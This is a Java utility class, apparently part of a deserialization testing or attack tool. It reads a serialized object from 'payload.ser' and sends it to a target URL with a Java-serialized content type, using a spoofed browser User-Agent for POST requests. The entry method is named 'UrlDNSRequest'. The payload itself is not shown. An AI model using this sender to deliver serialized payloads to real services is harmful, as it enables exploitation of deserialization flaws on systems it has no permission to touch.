package utils;

import java.io.*;
import java.net.*;
import java.util.Map;

public class HttpUtils {
    public static Integer UrlDNSRequest(String method, String url) throws Exception {
        if (method.equals("GET")){
            sendGetRequest(url);
            return 200;
        }else if (method.equals("POST")){
            sendPostRequest(url);
            return 200;
        }else {
            return 400;
        }
    }

    public static void sendGetRequest(String url) throws Exception {
        String[] split = url.split("/");
        String path = split[3];
        String domain_port = split[2];
        String domain = domain_port.split(":")[0];
        Integer port = Integer.valueOf(domain_port.split(":")[1]);


        Socket socket = new Socket(domain, port);
        StringBuffer buffer = new StringBuffer();
        //要上传的文件
        File file = new File("payload.ser");
        long length = file.length();
        System.out.println(length);


        buffer.append("GET /"+path+" HTTP/1.1\r\n");
        buffer.append("Host: "+domain_port+"\r\n");
        buffer.append("Content-Type: application/java-serialized-object\r\n");
        buffer.append("Content-Length: "+length+"\r\n");
        buffer.append("Connection: close\r\n");
        buffer.append("\r\n");
        System.out.println(buffer.toString());

        socket.getOutputStream().write(buffer.toString().getBytes());
        FileInputStream fis = new FileInputStream(file);
        byte[] bs = new byte[512];
        int len = -1;
        while ((len = fis.read(bs)) != -1) {
            socket.getOutputStream().write(bs,0,len);
        }

        BufferedReader reader = new BufferedReader(new InputStreamReader(
                socket.getInputStream()));
        String line = null;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }

    public static void sendPostRequest(String url) throws Exception {
        //1.开启Http连接
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(10*1000);
        conn.setDoOutput(true); // 允许输出

        //2.Http请求行/头
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/java-serialized-object");
        conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
        conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        conn.setRequestProperty("Connection", "close");
        conn.connect();

        //3.Http请求体
        InputStream in = new FileInputStream("payload.ser");
//        OutputStream outputStream = conn.getOutputStream();
        DataOutputStream out = new DataOutputStream(conn.getOutputStream());
        System.out.println(in);
        byte[] b = new byte[1024];
        int l = 0;
        while((l = in.read(b)) != -1) out.write(b,0,l); // 写入文件
        out.flush();
        out.close();
        in.close();
        int responseCode = conn.getResponseCode();
    }
}
